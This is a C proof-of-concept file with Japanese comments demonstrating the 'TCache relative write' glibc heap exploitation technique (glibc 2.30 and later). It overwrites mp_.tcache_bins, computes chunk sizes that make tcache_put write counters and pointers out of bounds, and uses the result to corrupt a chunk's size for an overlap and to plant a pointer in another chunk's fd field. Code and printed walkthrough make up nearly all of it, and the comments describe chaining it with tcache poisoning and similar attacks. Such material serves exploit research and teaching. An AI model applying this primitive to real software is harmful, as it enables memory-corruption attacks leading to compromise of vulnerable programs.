#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <malloc.h>

int main(void)
{
    /*
     * このドキュメントは、TCache relative write(tcache 相対書き込み)手法を実演します。
     * Reference: https://d4r30.github.io/heap-exploit/2025/11/25/tcache-relative-write.html
     *
     * 目的: 
     *   - ヒープ上の任意の場所に、準任意(あるいはおそらく完全に任意)の値を書き込むこと
     *   - 攻撃者が制御するチャンク(chunk)のポインタを、ヒープ上の任意の場所に書き込むこと
     * 
     * 原因: UAF/オーバーフロー
     * 対象バージョン: GLIBC >=2.30
     *
     * 前提条件:
     * 	 - 任意の場所に大きな値(>64)を書き込めること
     * 	 - libc のリーク
     * 	 - TCache の最大チャンクサイズ(0x408)より大きいサイズで malloc/free できること
     *
     * 概要: 
     * 「TCache relative write」の核心は、アロケータが tcache チャンクを
     * `tcache_perthread_struct`(tcache のメタデータ)に記録するとき、計算された tcachebin のインデックス(`tc_idx`)に
     * 対して十分なチェックや制限を行わない、という事実にあります。そのため、tcachebin のカウントと先頭
     * ポインタが書き込まれる場所は、アロケータによっていかなる形でも制限されません。アロケータは、
     * `tcache_put` と `tcache_get` のどちらの場面でも、拡張された bin インデックスを有効なものとして扱います。
     * mp_(malloc_par の tcache_bins)のフィールドの1つに、何らかの方法で巨大な値を書き込めれば、
     * TCache の範囲より大きいチャンクサイズを要求することで、**tcachebin のポインタ**と
     * **カウンタ**が書き込まれる場所を制御できます。`tcache_perthread_struct` は通常
     * ヒープ上に置かれるため、tcache のメタデータチャンクより後ろにある任意の地点に対して
     * *TCache relative write* を行えます(tcache のメタデータを汚染するために `tcache->entries` のリスト上でも可能です)。
     * 新しく free された tcache チャンクのポインタを書き込むことで、この手法を tcache poisoning や fastbin corruption などの
     * 他の手法と組み合わせ、ヒープのリークを引き起こせます。新しいカウンタを書き込むことで、`tcache->entries` を汚染したり、
     * 適切な回数の malloc と free によって、準任意の 10 進数の値を
     * ヒープの任意の場所に書き込んだりできます。これらをすべて組み合わせると、
     * この手法を土台にして、影響の大きいエクスプロイトの連鎖を作ることができます。
     *
     * PoC written by D4R30 (Mahdyar Bahrami)
     *
    */

    setbuf(stdout, NULL);
    
    printf("このファイルは、TCache relative write を実演します。これは、ヒープ上での任意の 10 進数の書き込みと、チャンクポインタの任意書き込みを実現する手法です。\n");
    printf("この手法は、アロケータが、計算された tcache のインデックス(tc_idx)に対して適切な制限を課していないという事実を利用します\n");
    printf("前提条件として、任意の場所に大きな値(64 より大きい任意の値)を書き込める必要があります。今回の場合、その場所は mp_.tcache_bins です\n\n");    

    unsigned long *p1 = malloc(0x410);	// オーバーフローまたは UAF を起こせるチャンク
    unsigned long *p2 = malloc(0x100);	// チャンクのオーバーラップを実演するための標的チャンク
    size_t p2_orig_size = p2[-1];
    
    free(p1);	// この PoC では、p1 を単に libc のリークのために使います

    /* VULNERABILITY */

    printf("まず、tcache のインデックスのチェックを回避するために、mp_.tcache_bins に大きな値を書き込む必要があります。\n");
    printf("これは、unsortedbin attack と似た効果を持つ手法、たとえば largebin attack、fastbin_reverse_into_tcache、house_of_mind_fastbins などで行えます\n");
    
    // --- ステップ1: mp_.tcache_bins に巨大な値を書き込む ---
    // 任意の場所に巨大な値を書き込める必要があります。これは、完全な任意書き込みである
    // 必要はありません。64 より大きい値であれば、どんな値でも十分です。
    // これは、プログラム固有の方法や、対象プログラムの UAF/オーバーフローによって実現できます。
    // UAF/オーバーフローを使えば、largebin attack、fastbin_reverse_into_tcache、
    // house of mind (fastbins) などの手法を使えます。

    unsigned long *mp_tcache_bins = (void*)p1[0] - 0x938;   // &mp_.tcache_bins を相対的に計算します
    printf("&mp_.tcache_bins: %p\n", mp_tcache_bins);

    *mp_tcache_bins = 0x7fffffffffff;	// mp_.tcache_bins に大きな値を書き込みます
    printf("mp_.tcache_bins が大きな値に設定されました。これにより、tc_idx に対する唯一のチェックを通過できます\n\n");

    // Note: mp_.tcache_bins に加えて mp_.tcache_count も大きな値にできる場合は、
    // 完全に任意の 10 進数の書き込みを引き起こせます。通常の場合、mp_tcache_bins だけを大きな値にしても、
    // 標的に書き込める値は [0,7] の範囲に限られます。  
    printf("mp_.tcache_count も大きな値に設定できるなら、*完全に*任意の書き込みを実現できるかもしれません。\n");

    /* END VULNERABILITY */

    /*
     * 狙いは、正確な `tc_idx` を作り込み、それが `tcache_put` で使われたときに、
     * tcachebin のポインタとそのカウンタの書き込みが、`tcache_perthread_struct`(ヒープ上にあります)の
     * 範囲外、つまり標的の場所に対して起こるようにすることです。これは、適切なサイズのチャンクを要求し、
     * それを free することで行います。適切なサイズを計算するには、`csize2tidx` と、
     * インデックス計算における `tcache_put` 内のポインタ演算を考慮する必要があります。範囲外書き込みを止められる
     * 唯一のチェックは `tc_idx < mp_.tcache_bins` で、これは `mp_.tcache_bins` に大きな値を書き込むことで
     * 回避できます(ステップ1ですでに行いました)   
    */

    // --- ステップ2: malloc して free する、正しいチャンクサイズを計算する --- 
    /*
     * 次のステップは、tcache_put を騙して、カウンタやポインタ変数を目的の場所に書き込ませるために、
     * malloc して free すべき正確なチャンクサイズ(nb)を求めることです。
     * サイズを正確に計算するには、まず tc_idx(tcache のインデックス)がどのように計算されるかを理解する必要があります。
     * tc_idx は csize2tidx マクロで計算されます。その定義は次のとおりです。
    
      # define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
    
     * `nb` を free されるチャンクサイズの内部形式、`MALLOC_ALIGNMENT=0x10`、`MINSIZE=0x20` とすると、次のようになります。
     * tc_index = (nb - 0x20 + 0x10 -1) / 0x10 = (nb - 0x11) / 0x10
     * tc_index は整数なので: tc_index = (nb-16)/16 - 1
     * したがって、`nb = 0x20`(最小のチャンクサイズ)なら `tc_index = 0`、`nb = 0x30` なら `tc_index = 1`、以下同様です。
     * C のポインタ演算に関する知識があれば、`nb` さえ分かっていれば、tcachebin のポインタとカウンタが
     * 書き込まれる場所を予測できます。
     
     * unsigned long *ptr_write_loc = (void*)(&tcache->entries) + 8*tc_index = (void*)(&tcache->entries) + (nb-16)/2 - 8
     * unsigned long *counter_write_loc = (void*)(&tcache->counts) + 2*tc_index = (void*)(&tcache->counts) + (nb-16)/8 - 2
    
     * Note: ここで `tcache` は、ヒープに割り当てられた `tcache_perthread_struct` へのポインタを表す記号にすぎません
     * 言い換えると: 
     
       * tcache のポインタで上書きしたい場所 = tcache_entries の位置 + (nb-16)/2 - 8
       * カウンタで上書きしたい場所 = tcache_counts の位置 + (nb-16)/8 - 2
     
     * Note: nb を計算するのに、tcache_perthread_struct と選んだ場所の絶対アドレスは必要ありません。
     * この2つの場所の差だけが必要です。
     * したがって: 
         - チャンクポインタの任意書き込みの場合: nb = 2*(delta+8)+16
	 - カウンタの任意書き込みの場合: nb = 8*(delta+2)+16 
     
     * 例えば、tcache 構造体が `0x555555559000` に割り当てられていて、`0x5555555596b8` にある half-word(2バイト)
     * (`++counts[tc_index]`)を上書きしたいとします: 
     * delta = 0x5555555596b8 - (&tcache->counts) = 0x5555555596b8 - 0x555555559010 = 0x6a8
     * ASLR が有効でも、delta は常に `0x6a8` です。したがって、ヒープのリークは必要ありません。
    */

    // --- ステップ3: 他の手法と組み合わせて、影響の大きい攻撃の連鎖を作る ---
    // この PoC では、2つの主要なプリミティブを示すために、チャンクのオーバーラップと、ポインタの任意書き込みを引き起こします。
    //
    // Note: チャンクのオーバーラップ攻撃とポインタの任意書き込みは、ここで考えられる使い道のうちの2つにすぎません。tcache relative write を
    // 土台にして、他にも幅広い攻撃の連鎖を考え出せます。同じチャンクを複数回要求して free することで、
    // 任意の 10 進数の値を書き込めることは明らかです。チャンクのオーバーラップ攻撃は、
    // それを使う簡単な方法の1つにすぎません。 

    // ---------------------------------
    // | Ex: チャンクのオーバーラップを引き起こす |
    // ---------------------------------
    // カウンタの任意書き込みを実際に見るために、p2->size にカウンタを書き込んで、チャンク p2 を
    // 非常に大きなチャンクにし、次のチャンクとオーバーラップさせたいとします。   
    // まず delta を計算し、それを先ほど説明した式に入れて nb を求める必要があります。
    printf("--- チャンクのオーバーラップ攻撃 ---\n");
    printf("ここでの目標は、大きなオーバーラップするチャンクを作ることです。すでに2つのチャンク p1(%p) と p2(%p) を割り当てています\n", p1, p2);
    printf("目標は、p2->size を破壊して、オーバーラップするチャンクにすることです。p2 の元の使用可能サイズは 0x%lx です\n", p2_orig_size);
    printf("p2->size が破壊される形で tcache relative write を発動するには、malloc して free する正確なチャンクサイズ(nb)を計算する必要があります\n");
    printf("次の式を使います: nb = 8*(delta+2)+16\n");

    void *tcache_counts = (void*)p1 - 0x290; 	// tcache->counts を取得します	
    unsigned long delta = ((void*)p2 - 6) - tcache_counts;

    // 上の式に基づく: nb = 8*(delta+2)+16
    unsigned long nb = 8*(delta+2)+16;

    // これで完了です! 標的へのカウンタ書き込みを発動するために、どのチャンクサイズを要求すべきかが正確に分かりました
    unsigned long *p = malloc(nb-0x10);	
    
    // TCache relative write を発動します
    free(p);
    
    // p2 のサイズが変わったかどうかを確認しましょう
    assert(p2[-1] > p2_orig_size);
    printf("tcache relative write の後の p2->size: 0x%lx\n\n", p2[-1]);

    // これで p2 を free し、後でより大きな要求で取り戻せます
    free(p2);
    p = malloc(0x10100); 

    // 新しく返されたポインタが p2 と等しいかどうかを確認しましょう 
    assert(p == p2);

    // -------------------------------------
    // | Ex: チャンクポインタの任意書き込み |
    // -------------------------------------
    // 次に、tcache relative write の威力をさらに示すために、free されるチャンクの
    // ポインタを任意の場所に相対書き込みしてみましょう。これは、tcache poisoning、fastbin corruption、
    // House of Lore などに使えます。
    printf("--- チャンクポインタの任意書き込み ---\n");
    printf("チャンクポインタの任意書き込みの能力を示すために、p2->fd に、free されるチャンクのポインタを書き込むことを目標にします\n");
    printf("式 nb = 2*(delta+8)+16 を使います");

    // delta を計算します(&p1->fd と &tcache->entries の差)
    void *tcache_entries = (void*)p1 - 0x210;  // &tcache->entries を計算します
    delta = (void*)p1 - tcache_entries;

    // 先ほど説明した式に基づく: nb = 2*(delta+8)+16
    nb = 2*(delta+8)+16; 

    printf("サイズ 0x%lx のチャンクを要求して、free する必要があります\n", nb-0x10);
    p = malloc(nb-0x10); 

    // tcache relative write を発動します(free されるポインタを p1->fd に書き込みます)
    printf("p (%p) を free して、相対書き込みを発動します。\n", p);
    free(p);

    assert(p1[0] == (unsigned long)p);
    printf("p1->fd は、先ほど free したチャンク p に設定されました。\n");

    // tcache poisoning、fastbin corruption(tcache relative write では <2.32 のみ)、house of lore など....
}

